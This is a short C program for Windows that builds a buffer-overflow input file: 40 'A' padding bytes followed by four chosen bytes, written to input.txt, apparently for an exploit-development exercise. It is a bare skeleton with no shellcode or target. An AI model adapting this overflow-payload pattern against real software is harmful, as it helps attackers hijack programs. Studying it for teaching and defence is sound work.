#include <stdio.h>
#include <windows.h>
#include <string.h>




int main(int argc, char *argv[])
{
	char command[1000] = {0};
	

	// padding
	for(int i=0; i< 40; i++) {
		strcat(command, "A");	
	}
	
	// some bytes of your choice
	strcat(command,  "\x45\x44\x43\x42");
	
	
	char const   filename[20] = "input.txt";
	

	printf("Writing %s to %s\n", command, filename);
	
	
	FILE * fp = fopen(filename, "wb");
	fwrite(command,1, strlen(command) + 1, fp);
	fclose(fp);

    return 0;
}